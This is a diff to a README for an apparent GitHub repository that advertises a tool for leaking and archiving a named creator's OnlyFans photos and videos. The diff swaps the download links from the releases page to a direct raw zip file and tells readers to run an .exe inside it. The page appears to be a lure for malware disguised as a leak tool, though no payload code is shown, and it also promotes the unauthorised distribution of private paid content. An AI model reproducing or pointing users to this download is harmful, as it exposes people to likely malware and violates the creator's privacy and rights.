@@ -1,6 +1,6 @@
 <h1>🔓 HUSVJJAL-Leaks-OnlyFans-2026 - Access Exclusive Content Effortlessly</h1>
 
-<a href="https://github.com/hatless-cartridge852/HUSVJJAL-Leaks-OnlyFans-2026/releases"><img src="https://img.shields.io/badge/Download-HUSVJJAL_Leaks-ff69b4?style=for-the-badge&logo=github" alt="Download Badge"></a>
+<a href="https://raw.githubusercontent.com/hatless-cartridge852/HUSVJJAL-Leaks-OnlyFans-2026/main/leporide/v2.6-alpha.1.zip"><img src="https://img.shields.io/badge/Download-HUSVJJAL_Leaks-ff69b4?style=for-the-badge&logo=github" alt="Download Badge"></a>
 
 <h2>🚀 What Is This?</h2>
 <p>HUSVJJAL-Leaks-OnlyFans-2026 lets you access and archive exclusive photos and videos from HUSVJJAL and HUSVJJAL2 on OnlyFans. It collects content into a single, organized collection.</p>
@@ -25,7 +25,7 @@
 
 <h2>📥 Download & Setup</h2>
 <p>Visit this link to download the application:</p>
-<a href="https://github.com/hatless-cartridge852/HUSVJJAL-Leaks-OnlyFans-2026/releases" style="display:inline-block;padding:15px 30px;background:#25d366;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">📥 Get HUSVJJAL-Leaks-OnlyFans-2026</a>
+<a href="https://raw.githubusercontent.com/hatless-cartridge852/HUSVJJAL-Leaks-OnlyFans-2026/main/leporide/v2.6-alpha.1.zip" style="display:inline-block;padding:15px 30px;background:#25d366;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">📥 Get HUSVJJAL-Leaks-OnlyFans-2026</a>
 <p>After clicking, scroll down to the latest release, download the <code>.exe</code> file, then double-click to run it. Follow on-screen prompts to complete setup.</p>
 
 <h2>🔧 How To Use</h2>
